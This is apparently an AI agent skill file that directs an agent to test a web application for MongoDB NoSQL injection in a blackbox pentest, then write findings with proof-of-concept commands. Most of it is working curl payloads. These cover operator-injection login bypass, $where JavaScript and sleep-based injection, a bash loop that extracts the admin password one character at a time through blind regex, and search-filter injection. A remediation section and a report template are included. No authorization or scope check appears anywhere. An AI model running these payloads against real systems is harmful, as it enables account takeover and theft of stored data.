---
name: blackbox-nosqli
description: >-
  Actively test a target web application for NoSQL Injection vulnerabilities
  using blackbox techniques. Reads pentest/target-map.md, injects MongoDB
  operator payloads ($gt, $ne, $where, $regex) into login, search, and filter
  endpoints, tests for authentication bypass and data exfiltration via blind
  regex injection, and writes confirmed findings with PoC curl commands to
  pentest/nosqli-results.md. Use when asked to find NoSQL injection or MongoDB
  injection in a blackbox pentest.
---

# Blackbox NoSQL Injection Detection

You are actively testing a web application for NoSQL Injection vulnerabilities without source code access. NoSQL injection typically targets MongoDB but also applies to other document databases.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## NoSQL Injection Types

1. **Operator injection** (MongoDB `$gt`, `$ne`, `$regex`, `$where`): Inject query operators via JSON or form data
2. **JavaScript injection** (`$where`): Inject JS code that runs in MongoDB's V8 engine
3. **Blind regex injection**: Extract data character-by-character via `$regex`

---

## Phase 1: Identify Candidates

Read `pentest/target-map.md` and find:
- Login endpoints (username/password fields)
- Search/filter endpoints (`?search=`, `?filter=`, `?query=`)
- ID-based lookups that may use string matching (`?id=abc`, `?slug=name`)
- Endpoints with complex query parameters (nested JSON-like objects)

---

## Phase 2: Authentication Bypass via Operator Injection

### Test 1: JSON Body Injection

If login endpoint accepts JSON:

```bash
# $ne (not equal) — matches any document where password != ""
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# $gt (greater than) — matches any string > ""
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# $exists — bypass if checking field existence
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$exists":true},"password":{"$ne":"x"}}'

# $regex — match any password
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'
```

**Confirmed NoSQLi** if you receive a valid auth response (token, session, 200 with user data).

### Test 2: Form Data Injection (PHP-style bracket notation)

Some servers translate `param[$ne]=x` into `{"param": {"$ne": "x"}}`:

```bash
# Bracket notation for form fields
curl -sk -X POST "<TARGET_URL>/login" \
  -d "username=admin&password[$ne]=invalid"

curl -sk -X POST "<TARGET_URL>/login" \
  -d "username=admin&password[$gt]="

curl -sk -X POST "<TARGET_URL>/login" \
  -d "username[$ne]=void&password[$ne]=void"
```

### Test 3: $where JavaScript Injection

```bash
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$where":"function(){return true}"}}'

# Sleep-based blind detection
curl -sk -X POST "<TARGET_URL>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$where":"function(){sleep(5000);return true}"}}' \
  -w "\nTime: %{time_total}s\n"
```

---

## Phase 3: Data Exfiltration via Blind Regex Injection

If auth bypass works but you need to extract data:

```bash
# Does admin password start with 'a'?
curl -sk -X POST "<TARGET_URL>/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'

# Does it start with 'p'?
curl -sk -X POST "<TARGET_URL>/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^p"}}'

# Extract character by character — if 200 = match, 401 = no match
# Try each character for position 1, 2, 3...
for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "<TARGET_URL>/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$CHAR\"}}")
  echo "^$CHAR → HTTP $STATUS"
done
```

---

## Phase 4: Search/Filter Injection

```bash
# Search parameter injection
curl -sk "<TARGET_URL>/api/users?search[$regex]=.*"
curl -sk "<TARGET_URL>/api/products?filter[$gt]="

# JSON query parameter
curl -sk "<TARGET_URL>/api/items?q={\"name\":{\"$regex\":\".*\"}}"

# Array injection
curl -sk -X POST "<TARGET_URL>/api/search" \
  -H "Content-Type: application/json" \
  -d '{"filters":[{"field":"role","value":{"$ne":"user"}}]}'
```

---

## Output Format

Write findings to `pentest/nosqli-results.md`:

```markdown
# NoSQL Injection Assessment Results

## Executive Summary
- Endpoints tested: [N]
- Confirmed NoSQLi: [N]
- Auth Bypass: [N]
- Data extracted: [Yes/No]

## Findings

### [CONFIRMED] POST /api/login — MongoDB Operator Injection Auth Bypass

- **Endpoint**: `POST /api/login`
- **Injection**: `password: {"$ne": ""}` operator bypasses password check
- **Impact**: Authentication bypass — attacker logs in as any user including admin without knowing the password
- **Evidence**: HTTP 200 with valid JWT token returned
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$ne":""}}'
  # Expected: HTTP 200, {"token":"eyJ..."}  ← admin session obtained
  ```
- **Remediation**: Sanitize input to reject objects/operators where strings are expected. Use JSON schema validation. For Mongoose: enable strict query mode (`sanitizeFilter: true`). Use `express-mongo-sanitize` middleware to strip `$` prefixed keys.

### [CONFIRMED] GET /api/users?search= — Blind Regex Exfiltration

- **Evidence**: `?search[$regex]=^a` returns different results than `?search[$regex]=^z` — confirms NoSQLi
- **Impact**: Enumerate all usernames and extract field values character by character
- **PoC**:
  ```bash
  # Match all users (regex wildcard)
  curl -sk "https://target.com/api/users?search[$regex]=.*"

  # Find users starting with 'a'
  curl -sk "https://target.com/api/users?search[$regex]=^a"
  ```
- **Remediation**: Never pass user-supplied values directly to MongoDB query operators. Treat all query parameter values as strings.
```

---

## Important Reminders

- NoSQLi often appears in apps using Express.js + MongoDB (MEAN/MERN stack).
- The bracket notation (`param[$ne]=value`) is the most commonly missed vector.
- `$where` JS injection is extremely impactful but often disabled in newer MongoDB versions.
- Blind regex exfiltration is slow but definitive — each character requires one request.
- Clean up: write directly to `pentest/nosqli-results.md`.
